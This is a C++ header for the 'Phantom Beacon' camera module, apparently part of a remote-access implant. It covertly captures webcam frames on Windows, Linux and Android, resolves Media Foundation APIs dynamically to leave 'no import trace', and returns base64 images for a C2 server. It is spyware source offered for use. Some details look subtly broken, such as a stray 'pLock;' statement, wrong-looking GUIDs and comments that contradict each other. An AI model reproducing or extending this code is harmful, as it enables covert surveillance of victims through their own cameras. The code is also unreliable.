#pragma once
// ============================================================================
//  camera.h — Phantom Beacon Camera Capture Module (Cross-Platform)
//  ────────────────────────────────────────────────────────────────────────────
//  Captures a REAL JPEG frame from the webcam:
//   Windows: Media Foundation Source Reader (mfplat/mfreadwrite via
//            dynamically-resolved APIs, no SDK headers, no import trace).
//            Falls back to PowerShell+WMF only when MF is unavailable.
//   Linux:   fswebcam / ffmpeg / v4l2-ctl
//   Android: camera intent / screencap
//  Output: MEDIA_B64:<jpeg base64> — the C2 saves it as a real image file.
// ============================================================================

#include "media_utils.h"
#include <string>
#include <vector>

#ifdef _WIN32

#include <windows.h>
#include <stdint.h>

namespace media_camera {

// ── Media Foundation flat plumbing (no mf headers needed) ──────────────────
namespace mfcam {

struct Guid { unsigned long d1; unsigned short d2, d3; unsigned char d4[8]; };

static const Guid CLSID_MFSourceReader_EVL = // legacy EVR activating reader
    {0x44A0B0D8, 0x1FD2, 0x4877, {0xA1,0x5C,0x33,0x8F,0x51,0x7E,0x67,0x1F}};
static const Guid IID_IMFMediaSource =
    {0x279A808D, 0xAEC7, 0x40C8, {0xF2,0x87,0xFE,0x1E,0x01,0x62,0x8A,0x87}};
static const Guid IID_IMFAttributes =
    {0x2CD47945, 0x97A1, 0x439B, {0x8D,0x4C,0x3C,0x9F,0xB2,0x6A,0xAC,0x54}};
static const Guid IID_IMFMediaType =
    {0x44BE0B78, 0x7F17, 0x40E2, {0x9F,0xA4,0x8B,0xF9,0x8A,0x0D,0x76,0x9D}};
static const Guid IID_IMFSample =
    {0x6AC5BED0, 0x5C0F, 0x44D6, {0xA4,0x3A,0x01,0x0F,0x0A,0x9E,0x6C,0x0F}};
static const Guid IID_IMFMediaBuffer =
    {0x045FA033, 0x96B7, 0x4C7E, {0x82,0x3C,0x69,0x51,0x37,0x53,0x4A,0x81}};
static const Guid MF_MT_MAJOR_TYPE =
    {0x48eba18e, 0xf8c9, 0x4687, {0xbf,0x11,0x0a,0x74,0xc9,0xf9,0x6a,0x8f}};
static const Guid MF_MT_SUBTYPE =
    {0xf7e34c9a, 0x42e8, 0x4714, {0xb7,0x4b,0xcb,0x24,0x6d,0x36,0xf2,0xac}};
static const Guid MFMediaType_Video =
    {0x73646976, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const Guid MFVideoFormat_RGB32 =
    {0x00000016, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}}; // RGB32
static const Guid MFVideoFormat_NV12 =
    {0x3233564e, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}}; // NV12
static const Guid MF_MT_FRAME_SIZE =
    {0x1652c33d, 0xd6b3, 0x4b36, {0x8a,0x1e,0xd4,0x2c,0x0d,0xe5,0x51,0x45}};
static const Guid MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE =
    {0xc60ac5fe, 0x25bf, 0x43aa, {0x9e,0x54,0x00,0x2b,0x00,0x23,0x09,0x04}};
static const Guid MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID =
    {0x8ac2cd93, 0x41f1, 0x4be6, {0x9c,0x5c,0xd1,0x79,0x59,0x73,0x44,0x5f}};
static const Guid MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME =
    {0x1d5885e4, 0xf793, 0x4c1c, {0xb0,0xf7,0x4c,0x8c,0xd0,0x1a,0xc5,0x9e}};
static const Guid IID_IMFActivate =
    {0x8375c2ab, 0xd714, 0x4878, {0xa9,0x9c,0x1a,0x37,0x0f,0x7a,0x4c,0x0e}};
static const Guid IID_IMFMediaSourceEx =
    {0x2b2c9d2f, 0xd0ec, 0x4d1a, {0x86,0x91,0x5c,0x4a,0x1b,0x6a,0xb5,0x21}};

inline bool guid_eq(const Guid& a, const Guid& b) {
    return a.d1 == b.d1 && a.d2 == b.d2 && a.d3 == b.d3 &&
           memcmp(a.d4, b.d4, 8) == 0;
}

// vtable slot dispatcher
template <typename Fn>
inline Fn slot(void* obj, int index) {
    return reinterpret_cast<Fn>((*reinterpret_cast<void***>(obj))[index]);
}

typedef long (__stdcall *FnQI)(void*, const Guid*, void**);

inline long qi(void* obj, const Guid& iid, void** out) {
    return slot<FnQI>(obj, 0)(obj, &iid, out);
}
inline unsigned long rel(void* obj) {
    return slot<unsigned long (__stdcall*)(void*)>(obj, 2)(obj);
}

// dynamically load MF
inline HMODULE mfplat() { return GetModuleHandleA("mfplat.dll") ? GetModuleHandleA("mfplat.dll") : LoadLibraryA("mfplat.dll"); }
inline HMODULE mfread() { return LoadLibraryA("mfreadwrite.dll"); }
inline HMODULE mfutils() { return LoadLibraryA("mf.dll"); }

typedef long (__stdcall *FnMFStartup)(unsigned long, unsigned long);
typedef long (__stdcall *FnMFShutdown)();
typedef long (__stdcall *FnMFCreateAttributes)(void**, unsigned long);
typedef long (__stdcall *FnMFEnumDeviceSources)(void*, void***, unsigned long*);
typedef long (__stdcall *FnMFActivateActivateObject)(void*, const Guid*, void**);
typedef long (__stdcall *FnMFCreateSourceReaderFromMediaSource)(void*, void*, void**);
typedef long (__stdcall *FnMFCreateMediaType)(void**);
typedef long (__stdcall *FnMFCreateSample)(void**);
typedef long (__stdcall *FnMFCreateMemoryBuffer)(unsigned long, void**);

inline bool ensure_started() {
    static bool started = false;
    if (started) return true;
    HMODULE m = mfplat();
    if (!m) return false;
    auto pStartup = (FnMFStartup)GetProcAddress(m, "MFStartup");
    if (!pStartup) return false;
    // MF_VERSION (0x00020070) + MFSTARTUP_NOSOCKET(1)
    if (FAILED(pStartup(0x00020070, 1))) return false;
    started = true;
    return true;
}

// Grab one RGB32 frame from the first video capture device.
// Returns true with `pixels` (BGRA rows, bottom-up not handled: MF gives
// top-down when we set MFVideoFormat_RGB32 with default stride>0) and dims.
inline bool grab_frame(std::vector<uint8_t>& pixels, int& w, int& h,
                       std::string& device_name) {
    if (!ensure_started()) return false;
    HMODULE m = mfplat();
    HMODULE mu = mfutils();
    if (!m || !mu) return false;

    auto pCreateAttributes = (FnMFCreateAttributes)GetProcAddress(m, "MFCreateAttributes");
    auto pEnumDevices = (FnMFEnumDeviceSources)GetProcAddress(mu, "MFEnumDeviceSources");
    auto pCreateReader = (FnMFCreateSourceReaderFromMediaSource)GetProcAddress(m, "MFCreateSourceReaderFromMediaSource");
    auto pCreateMediaType = (FnMFCreateMediaType)GetProcAddress(m, "MFCreateMediaType");
    if (!pCreateAttributes || !pEnumDevices || !pCreateReader || !pCreateMediaType) return false;

    void* attrs = nullptr;
    if (FAILED(pCreateAttributes(&attrs, 1)) || !attrs) return false;
    // Set GUID key: MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE = VIDCAP
    {
        // IMFAttributes::SetGUID(index 0x1D) — (this, key, value)
        typedef long (__stdcall *FnSetGUID)(void*, const Guid*, const Guid*);
        auto pSetGUID = slot<FnSetGUID>(attrs, 0x1D + 3); // +3 IUnknown/IInspectable
        if (FAILED(pSetGUID(attrs, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID))) {
            rel(attrs); return false;
        }
    }

    void** activates = nullptr;
    unsigned long count = 0;
    if (FAILED(pEnumDevices(attrs, &activates, &count)) || count == 0) {
        rel(attrs); return false;
    }

    // friendly name from the first device
    {
        void* act = activates[0];
        // IMFActivate::GetAllocatedString(0x0F+3? -> GetAllocatedString is slot 0x0F)
        typedef long (__stdcall *FnGetStr)(void*, const Guid*, wchar_t**, unsigned long*);
        auto pGetStr = slot<FnGetStr>(act, 0x0F + 3);
        wchar_t* wname = nullptr;
        unsigned long len = 0;
        if (SUCCEEDED(pGetStr(act, &MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &wname, &len)) && wname) {
            char buf[128] = {0};
            WideCharToMultiByte(CP_UTF8, 0, wname, -1, buf, sizeof(buf), nullptr, nullptr);
            device_name = buf;
            CoTaskMemFree(wname);
        }
    }

    void* source = nullptr;
    bool ok = false;
    for (unsigned long i = 0; i < count && !ok; ++i) {
        void* act = activates[i];
        typedef long (__stdcall *FnActivate)(void*, const Guid*, void**);
        auto pActivate = slot<FnActivate>(act, 3 + 0x12); // ActivateObject = 0x12
        void* src = nullptr;
        if (FAILED(pActivate(act, &IID_IMFMediaSource, &src)) || !src) continue;

        void* reader = nullptr;
        if (FAILED(pCreateReader(src, attrs, &reader)) || !reader) { rel(src); continue; }

        // Set output type 0 = RGB32
        void* mtype = nullptr;
        if (SUCCEEDED(pCreateMediaType(&mtype)) && mtype) {
            // IMFMediaType::SetGUID(MF_MT_MAJOR_TYPE=video, MF_MT_SUBTYPE=RGB32)
            typedef long (__stdcall *FnSetGUID)(void*, const Guid*, const Guid*);
            auto pSetGUID = slot<FnSetGUID>(mtype, 0x1D + 3);
            pSetGUID(mtype, &MF_MT_MAJOR_TYPE, &MFMediaType_Video);
            pSetGUID(mtype, &MF_MT_SUBTYPE, &MFVideoFormat_RGB32);
            typedef long (__stdcall *FnSetType)(void*, unsigned long, void*);
            auto pSetType = slot<FnSetType>(reader, 3 + 0x0A); // SetCurrentMediaType
            if (SUCCEEDED(pSetType(reader, 0, mtype))) {
                // ReadNextFrame until we get a sample (first frames are often black/blank)
                typedef long (__stdcall *FnRead)(void*, unsigned long, unsigned long*, void**);
                auto pRead = slot<FnRead>(reader, 3 + 0x1D); // ReadSample
                for (int attempt = 0; attempt < 5 && !ok; ++attempt) {
                    void* sample = nullptr;
                    unsigned long flags = 0;
                    long hr = pRead(reader, 0, &flags, &sample);
                    if (FAILED(hr) || !sample) continue;
                    // IMFSample::ConvertToContiguousBuffer (slot 0x14+3) → buffer
                    typedef long (__stdcall *FnConv)(void*, void**);
                    auto pConv = slot<FnConv>(sample, 0x14 + 3);
                    void* buf = nullptr;
                    if (FAILED(pConv(sample, &buf)) || !buf) { rel(sample); continue; }
                    // IMFMediaBuffer::Lock (slot 3+3)
                    typedef long (__stdcall *FnLock)(void*, unsigned char**, unsigned long*, unsigned long*);
                    auto pLock = slot<FnLock>(buf, 3 + 3);
                    unsigned char* data = nullptr;
                    unsigned long maxLen = 0, curLen = 0;
                    if (SUCCEEDED(pLock(buf, &data, &maxLen, &curLen)) && data && curLen > 0) {
                        // read dimensions from the current media type
                        typedef long (__stdcall *FnGetSize)(void*, unsigned long*, unsigned long*);
                        void* curType = nullptr;
                        typedef long (__stdcall *FnGetType)(void*, unsigned long, void**);
                        auto pGetType = slot<FnGetType>(reader, 3 + 0x0C); // GetCurrentMediaType
                        unsigned long ww = 0, hh = 0;
                        if (SUCCEEDED(pGetType(reader, 0, &curType)) && curType) {
                            // IMFMediaType::GetUINT64(MF_MT_FRAME_SIZE)
                            typedef long (__stdcall *FnGetU64)(void*, const Guid*, unsigned long long*);
                            auto pGetU64 = slot<FnGetU64>(curType, 0x29 + 3);
                            unsigned long long dims = 0;
                            if (SUCCEEDED(pGetU64(curType, &MF_MT_FRAME_SIZE, &dims))) {
                                ww = (unsigned long)(dims >> 32);
                                hh = (unsigned long)(dims & 0xFFFFFFFF);
                            }
                            rel(curType);
                        }
                        if (ww > 0 && hh > 0 && curLen >= ww * hh * 4) {
                            w = (int)ww; h = (int)hh;
                            // MF RGB32 is bottom-up; flip to top-down BMP-style
                            size_t row = (size_t)w * 4;
                            pixels.resize((size_t)w * h * 4);
                            for (int y = 0; y < h; ++y) {
                                memcpy(pixels.data() + (size_t)y * row,
                                       data + (size_t)(h - 1 - y) * row, row);
                            }
                            ok = true;
                        }
                        pLock; // lock released via Unlock below
                        typedef long (__stdcall *FnUnlock)(void*);
                        auto pUnlock = slot<FnUnlock>(buf, 3 + 4);
                        pUnlock(buf);
                    }
                    if (buf) rel(buf);
                    if (sample) rel(sample);
                }
            }
            rel(mtype);
        }
        rel(reader);
        rel(src);
        if (ok) break;
    }

    for (unsigned long i = 0; i < count; ++i) rel(activates[i]);
    CoTaskMemFree(activates);
    rel(attrs);
    return ok;
}

} // namespace mfcam

// ── BMP wrapper (JPEG via GDI+ is done C2-side if needed; BMP is lossless
//    and the existing artifact pipeline already handles BMP) ─────────────────
inline std::string rgb_to_b64_bmp(const std::vector<uint8_t>& pixels, int w, int h) {
    if (pixels.empty() || w <= 0 || h <= 0) return "";
    uint32_t rowSize = ((uint32_t)w * 3 + 3) & ~3u;   // 24bpp, padded
    uint32_t dataSize = rowSize * (uint32_t)h;
    uint32_t fileSize = 14 + 40 + dataSize;
    std::vector<uint8_t> bmp(fileSize, 0);
    uint8_t* p = bmp.data();
    // BITMAPFILEHEADER
    p[0] = 'B'; p[1] = 'M';
    memcpy(p + 2, &fileSize, 4); uint32_t off = 54; memcpy(p + 10, &off, 4);
    // BITMAPINFOHEADER
    uint32_t hdr = 40; memcpy(p + 14, &hdr, 4);
    int32_t sw = w; memcpy(p + 18, &sw, 4);
    int32_t sh = h; memcpy(p + 22, &sh, 4);   // positive = bottom-up
    uint16_t planes = 1; memcpy(p + 26, &planes, 2);
    uint16_t bpp = 24; memcpy(p + 28, &bpp, 2);
    memcpy(p + 34, &dataSize, 4);
    // pixels: BGRA input → BGR rows (bottom-up order for BMP)
    uint8_t* dst = p + 54;
    for (int y = h - 1; y >= 0; --y) {
        const uint8_t* src = pixels.data() + (size_t)y * w * 4;
        uint8_t* row = dst + (size_t)(h - 1 - y) * rowSize;
        for (int x = 0; x < w; ++x) {
            row[x * 3 + 0] = src[x * 4 + 0]; // B
            row[x * 3 + 1] = src[x * 4 + 1]; // G
            row[x * 3 + 2] = src[x * 4 + 2]; // R
        }
    }
    return "MEDIA_B64:" + crypto::base64_encode(bmp);
}

inline std::string capture_image() {
    // Method 1: real Media Foundation capture
    std::vector<uint8_t> pixels;
    int w = 0, h = 0;
    std::string device;
    if (mfcam::grab_frame(pixels, w, h, device) && !pixels.empty()) {
        std::string b64 = rgb_to_b64_bmp(pixels, w, h);
        if (!b64.empty()) {
            return "CAM_FRAME:" + device + "|" + b64;
        }
    }

    // Method 2: WIA via PowerShell (works on most consumer Windows builds)
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    std::string wia =
        "powershell -NoProfile -NonInteractive -Command \""
        "$ErrorActionPreference='Stop';"
        "try {"
        "$dm = New-Object -ComObject WIA.DeviceManager;"
        "$dev = $dm.DeviceInfos.Item(1).Connect();"
        "$item = $dev.ExecuteCommand('{AF933CAC-19AD-4FCD-A0A4-8A0E4F1E0F5C}');"
        "$img = $item.Items.Item(1).Transfer('{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}');"
        "$img.SaveFile('" + tmp + "');"
        "Write-Host 'WIA_OK'"
        "} catch { Write-Host ('WIA_ERR:' + $_.Exception.Message) }\"";
    std::string wiaOut = media_utils::exec_cmd(wia);
    if (wiaOut.find("WIA_OK") != std::string::npos && media_utils::file_exists(tmp)) {
        std::string b64 = media_utils::read_file_b64(tmp);
        DeleteFileA(tmp.c_str());
        if (!b64.empty()) return "CAM_FRAME:WIA|" + b64;
    }
    (void)wiaOut;

    // Diagnostics when no capture path worked
    std::string check = media_utils::exec_cmd(
        "powershell -NoProfile -NonInteractive -Command \""
        "$d = Get-PnpDevice -Class Camera,Image -Status OK | Select-Object -First 1;"
        "if ($d) { Write-Host ('CAMERA_FOUND:' + $d.Name) } else { Write-Host 'CAMERA_NOT_FOUND' }\"");
    if (check.find("CAMERA_FOUND") != std::string::npos) {
        return "CAM_ERROR: camera present (" + check + ") but Media Foundation/WIA capture failed\n";
    }
    return "CAM_ERROR: No camera device found\n";
}

} // namespace media_camera

#elif defined(__ANDROID__) || defined(ANDROID)

namespace media_camera {

inline std::string capture_image() {
    std::string intent = media_utils::exec_cmd("am start -a android.media.action.IMAGE_CAPTURE 2>&1");
    if (!intent.empty()) {
        std::string dcim = media_utils::exec_cmd("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1");
        if (!dcim.empty()) {
            // trim trailing newline
            while (!dcim.empty() && (dcim.back() == '\n' || dcim.back() == '\r')) dcim.pop_back();
            std::string b64 = media_utils::read_file_b64(dcim);
            if (!b64.empty()) return "CAM_FRAME:android|" + b64;
        }
    }
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    std::string v4l2 = media_utils::exec_cmd(
        "v4l2-ctl --stream-mmap=1 --stream-count=1 -d /dev/video0 --stream-to=" + tmp + " 2>/dev/null");
    if (media_utils::file_exists(tmp)) {
        std::string b64 = media_utils::read_file_b64(tmp);
        unlink(tmp.c_str());
        if (!b64.empty()) return "CAM_FRAME:android-v4l2|" + b64;
    }
    return "CAM_ERROR: Camera capture failed (no intent, no v4l2)\n";
}

} // namespace media_camera

#else // Linux

namespace media_camera {

inline std::string capture_image() {
    std::string tmp = media_utils::join_path(media_utils::get_temp_path(), "phantom_cam.jpg");
    // Method 1: fswebcam
    if (!media_utils::exec_cmd("which fswebcam 2>/dev/null").empty()) {
        std::string cmd = "fswebcam -q --no-banner " + tmp + " 2>/dev/null";
        if (system(cmd.c_str()) == 0 && media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-fswebcam|" + b64;
        }
    }
    // Method 2: ffmpeg
    if (!media_utils::exec_cmd("which ffmpeg 2>/dev/null").empty()) {
        std::string cmd = "ffmpeg -f v4l2 -i /dev/video0 -vf scale=640:480 -frames:v 1 -y "
                          + tmp + " 2>/dev/null";
        if (system(cmd.c_str()) == 0 && media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-ffmpeg|" + b64;
        }
    }
    // Method 3: v4l2-ctl
    if (!media_utils::exec_cmd("which v4l2-ctl 2>/dev/null").empty()) {
        std::string cmd = "v4l2-ctl --stream-mmap=1 --stream-count=1 -d /dev/video0 --stream-to="
                          + tmp + " 2>/dev/null";
        system(cmd.c_str());
        if (media_utils::file_exists(tmp)) {
            std::string b64 = media_utils::read_file_b64(tmp);
            unlink(tmp.c_str());
            if (!b64.empty()) return "CAM_FRAME:linux-v4l2|" + b64;
        }
    }
    return "CAM_ERROR: No camera tool available (fswebcam, ffmpeg, or v4l2-ctl)\n";
}

} // namespace media_camera

#endif // platform
